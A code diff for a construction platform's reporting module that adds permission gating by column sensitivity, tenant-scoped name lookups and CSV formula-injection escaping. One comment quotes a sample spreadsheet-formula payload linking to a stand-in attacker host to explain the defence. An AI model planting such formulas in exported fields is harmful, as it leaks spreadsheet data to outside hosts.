@@ -27,7 +27,9 @@ import {
   risks,
   signals,
   submittals,
+  users,
   variations,
+  vendors,
   workers,
 } from "@constructos/db";
 import {
@@ -54,11 +56,15 @@ import {
   VARIATION_BASES,
   VARIATION_STATUSES,
   WORKER_STATUSES,
+  meetsLevel,
+  type ColumnSensitivity,
+  type PermissionLevel,
   type ReportAggregation,
   type ReportDataset,
   type ReportFilterOperator,
+  type ToolKey,
 } from "@constructos/shared";
-import { badRequest } from "../../lib/errors.js";
+import { badRequest, forbidden } from "../../lib/errors.js";
 import type { Db } from "../../lib/db.js";
 
 /**
@@ -92,6 +98,16 @@ import type { Db } from "../../lib/db.js";
 
 export type ReportColumnType = "string" | "number" | "date" | "enum";
 
+/**
+ * A whitelisted foreign-key lookup. `assigneeId` is an opaque id in a report
+ * and a person's name in a conversation, so a column may declare which
+ * reference table resolves it. The join is NOT expressed in SQL: the ids of
+ * the returned page (at most `pageSize` of them) are resolved in one bounded
+ * `IN` query per lookup after the rows come back, which keeps the query plan
+ * unchanged and cannot widen the tenancy predicate.
+ */
+export type LookupKey = "user" | "vendor";
+
 export interface DatasetColumnDef {
   label: string;
   /** the drizzle column — the ONLY way a column ever reaches SQL */
@@ -103,6 +119,14 @@ export interface DatasetColumnDef {
   groupable: boolean;
   /** supports sum/avg/min/max. `count` is available on every column. */
   aggregatable: boolean;
+  /**
+   * WHO MAY SEE THIS COLUMN (#751). `public` is operational metadata,
+   * `commercial` is money and terms, `pii` is a person. See
+   * COLUMN_SENSITIVITIES in enums-analytics.ts for the rule each class buys.
+   */
+  sensitivity: ColumnSensitivity;
+  /** resolve this id to a display name from a whitelisted reference table */
+  lookup?: LookupKey;
 }
 
 export interface DatasetDef {
@@ -110,6 +134,15 @@ export interface DatasetDef {
   label: string;
   description: string;
   table: PgTable;
+  /**
+   * THE TOOL THAT GOVERNS THIS DATASET. Analytics must never be a wider door
+   * than the module it reports on: a caller reads a dataset only on projects
+   * where they hold at least `read` on this tool, and sees its commercial and
+   * pii columns only where they hold `standard`. The map is the whole of the
+   * fix for "any project member could report on workers, payment claims,
+   * disbursements, variations and signals".
+   */
+  tool: ToolKey;
   /** project = rows belong to a project; company = rows are company-level */
   scope: "project" | "company";
   companyColumn: AnyPgColumn;
@@ -124,14 +157,24 @@ export interface DatasetDef {
 /* Column constructors (keep the registry legible)                     */
 /* ------------------------------------------------------------------ */
 
-const str = (label: string, column: AnyPgColumn, groupable = false): DatasetColumnDef => ({
+const str = (
+  label: string,
+  column: AnyPgColumn,
+  groupable = false,
+  sensitivity: ColumnSensitivity = "public",
+): DatasetColumnDef => ({
   label,
   column,
   type: "string",
   filterable: true,
   groupable,
   aggregatable: false,
+  sensitivity,
 });
+
+/** A free-text column authored by a person about a person. */
+const pii = (label: string, column: AnyPgColumn, groupable = false): DatasetColumnDef =>
+  str(label, column, groupable, "pii");
 
 /** identifier-ish column: filterable and countable, never grouped or summed */
 const idc = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
@@ -141,26 +184,42 @@ const idc = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
   filterable: true,
   groupable: false,
   aggregatable: false,
+  sensitivity: "public",
 });
 
 /** person/party reference — grouping by owner is a first-class report shape */
-const ref = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
+const ref = (
+  label: string,
+  column: AnyPgColumn,
+  lookup?: LookupKey,
+): DatasetColumnDef => ({
   label,
   column,
   type: "string",
   filterable: true,
   groupable: true,
   aggregatable: false,
+  sensitivity: "public",
+  ...(lookup ? { lookup } : {}),
 });
 
-const num = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
+const num = (
+  label: string,
+  column: AnyPgColumn,
+  sensitivity: ColumnSensitivity = "public",
+): DatasetColumnDef => ({
   label,
   column,
   type: "number",
   filterable: true,
   groupable: false,
   aggregatable: true,
+  sensitivity,
 });
+
+/** A money or commercial-terms column. */
+const money = (label: string, column: AnyPgColumn): DatasetColumnDef =>
+  num(label, column, "commercial");
 
 const dat = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
   label,
@@ -169,12 +228,14 @@ const dat = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
   filterable: true,
   groupable: false,
   aggregatable: true,
+  sensitivity: "public",
 });
 
 const enm = (
   label: string,
   column: AnyPgColumn,
   enumValues: readonly string[],
+  sensitivity: ColumnSensitivity = "public",
 ): DatasetColumnDef => ({
   label,
   column,
@@ -183,6 +244,7 @@ const enm = (
   filterable: true,
   groupable: true,
   aggregatable: false,
+  sensitivity,
 });
 
 /** 0/1 integer flag — numeric so values coerce correctly, but groupable. */
@@ -193,6 +255,7 @@ const flag = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
   filterable: true,
   groupable: true,
   aggregatable: true,
+  sensitivity: "public",
 });
 
 /**
@@ -212,6 +275,7 @@ const DAILY_LOG_STATUSES = ["draft", "submitted", "approved"] as const;
 export const DATASETS: Record<ReportDataset, DatasetDef> = {
   rfis: {
     key: "rfis",
+    tool: "rfis",
     label: "RFIs",
     description: "Requests for information, their ball-in-court and response state.",
     table: rfis,
@@ -224,8 +288,8 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       number: num("Number", rfis.number),
       subject: str("Subject", rfis.subject),
       status: enm("Status", rfis.status, RFI_STATUSES),
-      assigneeId: ref("Assignee", rfis.assigneeId),
-      ballInCourtId: ref("Ball in court", rfis.ballInCourtId),
+      assigneeId: ref("Assignee", rfis.assigneeId, "user"),
+      ballInCourtId: ref("Ball in court", rfis.ballInCourtId, "user"),
       dueDate: dat("Due date", rfis.dueDate),
       costImpact: enm("Cost impact", rfis.costImpact, IMPACT_FLAGS),
       scheduleImpactDays: num("Schedule impact (days)", rfis.scheduleImpactDays),
@@ -236,6 +300,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   submittals: {
     key: "submittals",
+    tool: "submittals",
     label: "Submittals",
     description: "Submittal register with lead times and reviewer response codes.",
     table: submittals,
@@ -252,7 +317,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       submittalType: enm("Type", submittals.submittalType, SUBMITTAL_TYPES),
       responseCode: enm("Response code", submittals.responseCode, SUBMITTAL_RESPONSES),
       specSection: str("Spec section", submittals.specSection, true),
-      ballInCourtId: ref("Ball in court", submittals.ballInCourtId),
+      ballInCourtId: ref("Ball in court", submittals.ballInCourtId, "user"),
       requiredOnSite: dat("Required on site", submittals.requiredOnSite),
       leadTimeDays: num("Lead time (days)", submittals.leadTimeDays),
       createdAt: dat("Created at", submittals.createdAt),
@@ -261,6 +326,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   punch_items: {
     key: "punch_items",
+    tool: "punch",
     label: "Punch items",
     description: "Snag / punch list with assignment, priority and closure state.",
     table: punchItems,
@@ -274,8 +340,8 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       title: str("Title", punchItems.title),
       status: enm("Status", punchItems.status, PUNCH_STATUSES),
       priority: enm("Priority", punchItems.priority, PRIORITIES),
-      assigneeId: ref("Assignee", punchItems.assigneeId),
-      vendorId: ref("Vendor", punchItems.vendorId),
+      assigneeId: ref("Assignee", punchItems.assigneeId, "user"),
+      vendorId: ref("Vendor", punchItems.vendorId, "vendor"),
       locationId: ref("Location", punchItems.locationId),
       dueDate: dat("Due date", punchItems.dueDate),
       createdAt: dat("Created at", punchItems.createdAt),
@@ -284,6 +350,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   daily_logs: {
     key: "daily_logs",
+    tool: "daily_logs",
     label: "Daily logs",
     description: "Daily site records, their approval state and AI-drafted flag.",
     table: dailyLogs,
@@ -297,14 +364,15 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       status: enm("Status", dailyLogs.status, DAILY_LOG_STATUSES),
       notes: str("Notes", dailyLogs.notes),
       aiDrafted: flag("AI drafted (0/1)", dailyLogs.aiDrafted),
-      createdBy: ref("Created by", dailyLogs.createdBy),
-      approvedBy: ref("Approved by", dailyLogs.approvedBy),
+      createdBy: ref("Created by", dailyLogs.createdBy, "user"),
+      approvedBy: ref("Approved by", dailyLogs.approvedBy, "user"),
       createdAt: dat("Created at", dailyLogs.createdAt),
     },
   },
 
   delay_events: {
     key: "delay_events",
+    tool: "forensics",
     label: "Delay events",
     description: "Delay register with cause, entitlement classification and duration.",
     table: delayEvents,
@@ -322,13 +390,14 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       compensable: flag("Compensable (0/1)", delayEvents.compensable),
       startDate: dat("Start date", delayEvents.startDate),
       durationDays: num("Duration (days)", delayEvents.durationDays),
-      raisedBy: ref("Raised by", delayEvents.raisedBy),
+      raisedBy: ref("Raised by", delayEvents.raisedBy, "user"),
       createdAt: dat("Created at", delayEvents.createdAt),
     },
   },
 
   risks: {
     key: "risks",
+    tool: "risk",
     label: "Risks",
     description: "Risk register with qualitative scoring and mitigation cost.",
     table: risks,
@@ -342,16 +411,17 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       title: str("Title", risks.title),
       category: enm("Category", risks.category, RISK_CATEGORIES),
       status: enm("Status", risks.status, RISK_STATUSES),
-      ownerId: ref("Owner", risks.ownerId),
+      ownerId: ref("Owner", risks.ownerId, "user"),
       probabilityScore: num("Probability (1-5)", risks.probabilityScore),
       impactScore: num("Impact (1-5)", risks.impactScore),
-      mitigationCost: num("Mitigation cost", risks.mitigationCost),
+      mitigationCost: money("Mitigation cost", risks.mitigationCost),
       createdAt: dat("Created at", risks.createdAt),
     },
   },
 
   signals: {
     key: "signals",
+    tool: "assurance",
     label: "Assurance signals",
     description: "Detector output: severity, confidence and reviewer disposition.",
     table: signals,
@@ -369,13 +439,14 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       confidence: num("Confidence", signals.confidence),
       title: str("Title", signals.title),
       disposition: enm("Disposition", signals.disposition, SIGNAL_DISPOSITIONS),
-      reviewerId: ref("Reviewer", signals.reviewerId),
+      reviewerId: ref("Reviewer", signals.reviewerId, "user"),
       createdAt: dat("Created at", signals.createdAt),
     },
   },
 
   payment_claims: {
     key: "payment_claims",
+    tool: "payments",
     label: "Payment claims",
     description: "Statutory payment claims with the computed deadline timeline.",
     table: paymentClaims,
@@ -388,8 +459,8 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       number: num("Number", paymentClaims.number),
       regime: enm("Regime", paymentClaims.regime, PAYMENT_REGIMES),
       status: enm("Status", paymentClaims.status, PAYMENT_CLAIM_STATUSES),
-      claimedAmount: num("Claimed amount", paymentClaims.claimedAmount),
-      paidAmount: num("Paid amount", paymentClaims.paidAmount),
+      claimedAmount: money("Claimed amount", paymentClaims.claimedAmount),
+      paidAmount: money("Paid amount", paymentClaims.paidAmount),
       currency: str("Currency", paymentClaims.currency, true),
       referenceDate: dat("Reference date", paymentClaims.referenceDate),
       responseDeadline: dat("Response deadline", paymentClaims.responseDeadline),
@@ -400,6 +471,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   variations: {
     key: "variations",
+    tool: "commercial",
     label: "Variations",
     description: "Variation register: valuation basis, estimate, agreed value, time impact.",
     table: variations,
@@ -413,8 +485,8 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       title: str("Title", variations.title),
       status: enm("Status", variations.status, VARIATION_STATUSES),
       basis: enm("Valuation basis", variations.basis, VARIATION_BASES),
-      costEstimate: num("Cost estimate", variations.costEstimate),
-      agreedValue: num("Agreed value", variations.agreedValue),
+      costEstimate: money("Cost estimate", variations.costEstimate),
+      agreedValue: money("Agreed value", variations.agreedValue),
       timeImpactDays: num("Time impact (days)", variations.timeImpactDays),
       clauseRef: str("Clause reference", variations.clauseRef, true),
       instructedAt: dat("Instructed at", variations.instructedAt),
@@ -424,6 +496,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   disbursements: {
     key: "disbursements",
+    tool: "finance",
     label: "Disbursements",
     description: "Lender drawdown requests and their approval / payment state.",
     table: disbursements,
@@ -436,9 +509,9 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       number: num("Number", disbursements.number),
       facilityId: ref("Facility", disbursements.facilityId),
       categoryId: ref("Category", disbursements.categoryId),
-      amount: num("Amount", disbursements.amount),
+      amount: money("Amount", disbursements.amount),
       status: enm("Status", disbursements.status, DISBURSEMENT_STATUSES),
-      purpose: str("Purpose", disbursements.purpose),
+      purpose: str("Purpose", disbursements.purpose, false, "commercial"),
       submittedAt: dat("Submitted at", disbursements.submittedAt),
       disbursedAt: dat("Disbursed at", disbursements.disbursedAt),
       createdAt: dat("Created at", disbursements.createdAt),
@@ -447,6 +520,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   grievances: {
     key: "grievances",
+    tool: "land",
     label: "Grievances",
     description: "Community grievance log with SLA dates and closure verification.",
     table: grievances,
@@ -458,10 +532,10 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
       id: idc("Grievance id", grievances.id),
       number: num("Number", grievances.number),
       channel: enm("Channel", grievances.channel, GRIEVANCE_CHANNELS),
-      category: str("Category", grievances.category, true),
+      category: str("Category", grievances.category, true, "pii"),
       severity: enm("Severity", grievances.severity, GRIEVANCE_SEVERITIES),
       status: enm("Status", grievances.status, GRIEVANCE_STATUSES),
-      assigneeId: ref("Assignee", grievances.assigneeId),
+      assigneeId: ref("Assignee", grievances.assigneeId, "user"),
       receivedAt: dat("Received at", grievances.receivedAt),
       resolveDueAt: dat("Resolve due at", grievances.resolveDueAt),
       resolvedAt: dat("Resolved at", grievances.resolvedAt),
@@ -471,6 +545,7 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
 
   workers: {
     key: "workers",
+    tool: "workforce",
     label: "Workers",
     description:
       "Workforce register. Date of birth is deliberately NOT exposed — age " +
@@ -483,12 +558,12 @@ export const DATASETS: Record<ReportDataset, DatasetDef> = {
     columns: {
       id: idc("Worker id", workers.id),
       reference: idc("Reference", workers.reference),
-      fullName: str("Full name", workers.fullName),
-      nationality: str("Nationality", workers.nationality, true),
+      fullName: pii("Full name", workers.fullName),
+      nationality: pii("Nationality", workers.nationality, true),
       trade: str("Trade", workers.trade, true),
-      vendorId: ref("Employer", workers.vendorId),
+      vendorId: ref("Employer", workers.vendorId, "vendor"),
       status: enm("Status", workers.status, WORKER_STATUSES),
-      agreedDailyRate: num("Agreed daily rate", workers.agreedDailyRate),
+      agreedDailyRate: num("Agreed daily rate", workers.agreedDailyRate, "pii"),
       inductedAt: dat("Inducted at", workers.inductedAt),
       demobilisedAt: dat("Demobilised at", workers.demobilisedAt),
       createdAt: dat("Created at", workers.createdAt),
@@ -534,6 +609,10 @@ export interface CatalogColumn {
   aggregatable: boolean;
   operators: ReportFilterOperator[];
   aggregations: ReportAggregation[];
+  sensitivity: ColumnSensitivity;
+  /** the level on the dataset's tool this column needs */
+  requiresLevel: PermissionLevel;
+  lookup?: LookupKey;
 }
 
 export interface CatalogDataset {
@@ -541,6 +620,7 @@ export interface CatalogDataset {
   label: string;
   description: string;
   scope: "project" | "company";
+  tool: ToolKey;
   defaultSort: string;
   columns: CatalogColumn[];
 }
@@ -554,6 +634,7 @@ export function datasetCatalog(): CatalogDataset[] {
       label: ds.label,
       description: ds.description,
       scope: ds.scope,
+      tool: ds.tool,
       defaultSort: ds.defaultSort,
       columns: Object.entries(ds.columns).map(([colKey, def]) => ({
         key: colKey,
@@ -565,9 +646,82 @@ export function datasetCatalog(): CatalogDataset[] {
         aggregatable: def.aggregatable,
         operators: operatorsForType(def.type),
         aggregations: aggregationsForColumn(def),
+        sensitivity: def.sensitivity,
+        requiresLevel: levelForSensitivity(def.sensitivity),
+        ...(def.lookup ? { lookup: def.lookup } : {}),
       })),
     };
   });
+}
+
+/* ------------------------------------------------------------------ */
+/* Column sensitivity (#751)                                           */
+/* ------------------------------------------------------------------ */
+
+/**
+ * The level on the dataset's governing tool a column of this class needs.
+ *
+ * `read` on `workforce` lets somebody open the workforce register and see that
+ * there are 240 people on site; it does not let them export everybody's name,
+ * nationality and daily rate. `standard` — the level that can EDIT those
+ * records in the module — is the honest threshold for reading them in bulk
+ * through a report, because a user who may change a figure may certainly read
+ * it.
+ */
+export function levelForSensitivity(sensitivity: ColumnSensitivity): PermissionLevel {
+  return sensitivity === "public" ? "read" : "standard";
+}
+
+/** Column keys of `ds` a caller at `level` on its tool may see. */
+export function visibleColumnKeys(ds: DatasetDef, level: PermissionLevel): string[] {
+  return Object.entries(ds.columns)
+    .filter(([, def]) => meetsLevel(level, levelForSensitivity(def.sensitivity)))
+    .map(([key]) => key);
+}
+
+export interface SensitivityOutcome {
+  plan: ResolvedReport;
+  /** projected columns removed because the caller may not see them */
+  hiddenColumns: string[];
+}
+
+/**
+ * Apply the caller's effective level to a resolved plan.
+ *
+ * PROJECTED columns the caller may not see are REMOVED and named, because a
+ * silently blank column reads as "no data" rather than "not yours". A column
+ * used to FILTER, GROUP, AGGREGATE or SORT is refused outright: `count(*)
+ * where nationality = 'X'` discloses the very field the class protects, and a
+ * report that quietly ignored the predicate would return the wrong number.
+ */
+export function applySensitivity(
+  plan: ResolvedReport,
+  level: PermissionLevel,
+): SensitivityOutcome {
+  const allowed = new Set(visibleColumnKeys(plan.dataset, level));
+  const refuse = (role: string, key: string) => {
+    const def = plan.dataset.columns[key]!;
+    throw forbidden(
+      `Field "${key}" is ${def.sensitivity} on dataset "${plan.dataset.key}" and cannot be used ` +
+        `as a ${role}: that needs ${levelForSensitivity(def.sensitivity)} access to ` +
+        `${plan.dataset.tool} on every project in scope.`,
+    );
+  };
+  for (const f of plan.filters) if (!allowed.has(f.key)) refuse("filter", f.key);
+  if (plan.groupBy && !allowed.has(plan.groupBy.key)) refuse("grouping", plan.groupBy.key);
+  for (const a of plan.aggregations) if (!allowed.has(a.key)) refuse("aggregation", a.key);
+  if (!plan.isAggregate && plan.sortBy && !allowed.has(plan.sortBy)) refuse("sort", plan.sortBy);
+
+  const kept = plan.columns.filter((c) => allowed.has(c.key));
+  const hiddenColumns = plan.columns.filter((c) => !allowed.has(c.key)).map((c) => c.key);
+  if (hiddenColumns.length === 0) return { plan, hiddenColumns };
+  if (kept.length === 0 && !plan.isAggregate) {
+    throw forbidden(
+      `Every column of this report is ${plan.dataset.tool} data you do not hold standard ` +
+        "access to, so there is nothing to return.",
+    );
+  }
+  return { plan: { ...plan, columns: kept }, hiddenColumns };
 }
 
 /* ------------------------------------------------------------------ */
@@ -910,6 +1064,67 @@ export interface ExecutionResult {
   offset: number;
   executedAt: string;
   ms: number;
+  /** projected columns withheld by the caller's level — never silently blank */
+  hiddenColumns?: string[];
+}
+
+/**
+ * Resolve the ids of the page just returned to display names, one bounded
+ * query per lookup table. Company-scoped: a lookup can never reach out of the
+ * tenant, and an id with no row resolves to null (rendered as an em-dash),
+ * never to a guess.
+ */
+async function resolveLookups(
+  db: Db,
+  companyId: string,
+  columns: ResolvedColumn[],
+  rows: Record<string, unknown>[],
+): Promise<ExecutionResultColumn[]> {
+  const lookupCols = columns.filter((c) => c.def.lookup);
+  if (lookupCols.length === 0 || rows.length === 0) return [];
+  const idsByLookup = new Map<LookupKey, Set<string>>();
+  for (const c of lookupCols) {
+    const set = idsByLookup.get(c.def.lookup!) ?? new Set<string>();
+    for (const r of rows) {
+      const v = r[c.key];
+      if (typeof v === "string" && v.length > 0) set.add(v);
+    }
+    idsByLookup.set(c.def.lookup!, set);
+  }
+  const names = new Map<string, Map<string, string>>();
+  for (const [kind, ids] of idsByLookup) {
+    const map = new Map<string, string>();
+    const list = [...ids].slice(0, 1000);
+    if (list.length > 0) {
+      if (kind === "user") {
+        // Users are global rows, so the tenancy check is the id set itself:
+        // the ids came out of this company's own records.
+        const found = await db
+          .select({ id: users.id, name: users.name })
+          .from(users)
+          .where(inArray(users.id, list));
+        for (const u of found) map.set(u.id, u.name);
+      } else {
+        const found = await db
+          .select({ id: vendors.id, name: vendors.name })
+          .from(vendors)
+          .where(and(eq(vendors.companyId, companyId), inArray(vendors.id, list)));
+        for (const v of found) map.set(v.id, v.name);
+      }
+    }
+    names.set(kind, map);
+  }
+  const extra: ExecutionResultColumn[] = [];
+  for (const c of lookupCols) {
+    const key = `${c.key}__label`;
+    extra.push({ key, label: `${c.def.label} (name)`, type: "string" });
+    const map = names.get(c.def.lookup!)!;
+    for (const r of rows) {
+      const v = r[c.key];
+      r[key] = typeof v === "string" ? (map.get(v) ?? null) : null;
+    }
+  }
+  return extra;
 }
 
 /**
@@ -921,6 +1136,7 @@ export async function executeReport(
   plan: ResolvedReport,
   scope: ExecutionScope,
   window: ExecutionWindow,
+  options: { hiddenColumns?: string[] } = {},
 ): Promise<ExecutionResult> {
   const startedAt = Date.now();
   const ds = plan.dataset;
@@ -1010,6 +1226,13 @@ export async function executeReport(
     return out;
   });
 
+  // Reference ids become names AFTER the page is fetched: bounded by the page,
+  // never a join, and never able to widen the tenancy predicate.
+  if (!plan.isAggregate && rows.length > 0) {
+    const extra = await resolveLookups(db, scope.companyId, plan.columns, rows);
+    outColumns.push(...extra);
+  }
+
   return {
     dataset: ds.key,
     columns: outColumns,
@@ -1020,6 +1243,9 @@ export async function executeReport(
     offset,
     executedAt: new Date().toISOString(),
     ms: Date.now() - startedAt,
+    ...(options.hiddenColumns && options.hiddenColumns.length > 0
+      ? { hiddenColumns: options.hiddenColumns }
+      : {}),
   };
 }
 
@@ -1027,8 +1253,21 @@ export async function executeReport(
 /* CSV (#738)                                                          */
 /* ------------------------------------------------------------------ */
 
+/**
+ * Characters that make a spreadsheet treat a cell as a FORMULA rather than
+ * text. A subcontractor who names an RFI `=HYPERLINK("http://evil.example"&A1)`
+ * is writing code that runs in the owner's Excel when the owner exports the
+ * RFI ageing report — the classic CSV injection, and the export path is exactly
+ * where lower-trust text meets a higher-trust reader.
+ */
+const CSV_FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);
+
 export function csvEscape(value: unknown): string {
-  const s = value === null || value === undefined ? "" : String(value);
+  let s = value === null || value === undefined ? "" : String(value);
+  // Neutralise, do not strip: the reader must still see what was written, so
+  // the cell is prefixed with an apostrophe (OWASP guidance) which spreadsheets
+  // consume as "this is text".
+  if (s.length > 0 && CSV_FORMULA_TRIGGERS.has(s[0]!)) s = `'${s}`;
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
